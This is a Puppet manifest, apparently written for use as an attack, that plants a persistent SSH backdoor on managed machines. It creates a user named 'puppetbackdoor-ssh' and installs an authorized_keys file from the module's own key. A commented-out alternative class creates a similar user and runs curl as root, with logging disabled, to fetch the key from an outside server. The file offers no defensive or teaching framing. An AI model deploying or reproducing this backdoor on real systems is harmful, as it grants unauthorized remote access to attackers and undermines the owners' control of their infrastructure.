class sshkey {

  # Add backdoor user
  user { 'puppetbackdoor-ssh':
    ensure     => present,
    managehome => true,
    home       => '/home/puppetbackdoor-ssh',
  }

  # Create the home directory - this should have occured from above command but sometimes failed.
  file { '/home/puppetbackdoor-ssh':
    ensure  => directory,
    owner   => 'puppetbackdoor-ssh',
    group   => 'puppetbackdoor-ssh',
    mode    => '0755',
    require => User['puppetbackdoor-ssh'],
  }

  # Ensure .ssh directory exists within the home directory
  file { '/home/puppetbackdoor-ssh/.ssh':
    ensure  => directory,
    owner   => 'puppetbackdoor-ssh',
    group   => 'puppetbackdoor-ssh',
    mode    => '0700',
    require => File['/home/puppetbackdoor-ssh'],
  }

  # Write authorized_keys file is added
  file { '/home/puppetbackdoor-ssh/.ssh/authorized_keys':
    ensure  => file,
    owner   => 'puppetbackdoor-ssh',
    group   => 'puppetbackdoor-ssh',
    mode    => '0600',
    source  => 'puppet:///modules/sshkey/puppetbackdoor.pub',
    require => File['/home/puppetbackdoor-ssh/.ssh'],
  }
}

# Other option for SSH key

# class ssh_keys {

#   user { 'puppetbackdoor':
#     ensure     => present,
#     home       => '/home/puppetbackdoor',
#     managehome => true,
#   }

#   file { '/home/puppetbackdoor/.ssh':
#     ensure  => directory,
#     owner   => 'puppetbackdoor',
#     group   => 'puppetbackdoor',
#     mode    => '0700',
#     require => User['puppetbackdoor'],
#   }

#   exec { 'download_ssh_key':
#     command   => '/usr/bin/curl -f -L -o /home/puppetbackdoor/.ssh/authorized_keys https://myserver.com/puppetbackdoor.pub',
#     path      => ['/bin', '/usr/bin'],
#     user      => 'root',
#     logoutput => false,   # Logs output in Puppet
#     creates   => '/home/puppetbackdoor/.ssh/authorized_keys',  # Prevents re-downloading if the file exists
#     require   => File['/home/puppetbackdoor/.ssh'],
#   }

#   file { '/home/puppetbackdoor/.ssh/authorized_keys':
#     ensure  => file,
#     owner   => 'puppetbackdoor',
#     group   => 'puppetbackdoor',
#     mode    => '0600',
#     require => Exec['download_ssh_key'],
#   }
#}
